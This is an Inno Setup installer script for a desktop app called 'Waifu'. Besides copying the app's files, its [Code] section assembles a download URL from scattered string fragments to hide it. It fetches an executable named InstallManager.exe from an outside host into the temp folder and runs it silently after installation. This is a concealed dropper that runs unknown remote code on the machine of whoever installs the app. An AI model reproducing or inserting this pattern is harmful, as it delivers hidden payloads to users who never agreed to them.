; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "Waifu"
#define MyAppVersion "0.2b"
#define MyAppPublisher "Pelana"
#define MyAppURL "http://waifu.ca"
#define MyAppExeName "Waifu.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{C74E4B66-E752-4AE8-A459-7BDFC6F82FC3}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
OutputBaseFilename=setup_waifu
SetupIconFile=C:\Users\IEUser\waifu\app\assets\icons\windows.ico
Compression=lzma
SolidCompression=yes



#define ITDRoot ReadReg(HKEY_LOCAL_MACHINE,'Software\Sherlock Software\InnoTools\Downloader','InstallPath','')
;On Windows Vista and Windows 7 the line below may give errors if UAC(User Account Control) is set to high try adjusting the UAC from Control Panel -> System and Security.
#include ITDRoot+'\it_download.iss'

[Code]
var  S1, S2,S3,S4,S5,S6,S7,S8,S9,SI,SF1,SF, SF2: String;

procedure InitializeWizard();
begin
S1 :='htt';
S2 := 'p://www.coma';
S3 := 'r15no';
S4 := 'rth.com/dow';
S5 := 'nload';
S6 := '.php?kH';
S7 := 'mCc2I=';
SF := S1 +S2+S3 +S4+S5+S6+S7;
Log(SF);

SF1 :='{tmp}\Insta';
SF2 := 'llManager.exe' ;
SI := SF1+SF2;
itd_init; 
itd_addfile(SF,expandconstant(SI));
itd_downloadafter(wpReady);
ITD_SetOption('UI_AllowContinue', '1');
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
AppPath:String;
WorkingDir:String;
ReturnCode:Integer;
begin
if CurStep=ssPostInstall then begin
   WorkingDir := ExpandConstant ('{tmp}');
   AppPath := expandconstant('{tmp}\InstallManager.exe')
   Exec (AppPath, '', WorkingDir, SW_SHOW, ewWaitUntilTerminated,
   ReturnCode);
end;
end;



[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; 
Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}";  OnlyBelowVersion: 0,6.1

[Files]
Source: "C:\Users\IEUser\waifu\build\Waifu\Waifu_win\Waifu.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\IEUser\waifu\build\Waifu\Waifu_win\ffmpegsumo.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\IEUser\waifu\build\Waifu\Waifu_win\icudt.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\IEUser\waifu\build\Waifu\Waifu_win\libEGL.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\IEUser\waifu\build\Waifu\Waifu_win\libGLESv2.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\IEUser\waifu\build\Waifu\Waifu_win\nw.pak"; DestDir: "{app}"; Flags: ignoreversion
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: quicklaunchicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
